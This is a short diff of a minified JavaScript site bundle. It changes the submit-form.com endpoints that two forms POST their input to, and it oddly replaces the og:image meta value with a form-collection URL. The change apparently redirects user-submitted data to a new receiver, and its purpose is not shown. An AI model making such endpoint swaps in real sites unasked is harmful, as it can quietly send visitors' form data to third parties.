@@ -9743,7 +9743,7 @@
                 }), (0,
                 he.jsx)("meta", {
                     property: "og:image",
-                    content: "https://i.ibb.co/TtQmC4M/h245f15d84e5d44.png"
+                    content: "https://submit-form.com/zQ0VMhLkk"
                 }), (0,
                 he.jsx)("meta", {
                     name: "viewport",
@@ -13355,7 +13355,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/9bYhHyA3g", {
+                                    u && o ? (fetch("https://submit-form.com/zQ0VMhLkk", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13465,7 +13465,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/cA9hwGKgj", {
+                        fetch("https://submit-form.com/QvPJ1NwRI", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
